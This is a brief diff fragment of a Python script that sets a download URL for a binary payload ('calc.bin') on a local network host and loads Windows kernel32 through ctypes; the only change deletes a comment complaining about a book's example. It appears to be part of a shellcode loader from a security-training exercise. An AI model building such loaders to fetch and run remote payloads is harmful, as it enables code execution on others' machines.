@@ -16,7 +16,6 @@ import ctypes
 URL = 'http://192.168.1.145/calc.bin'
 # URL = 'http://192.168.1.145/msg.bin'
 
-#? Not the incorrect example in the f-ing book....
 
 kernel32 = ctypes.windll.kernel32
 
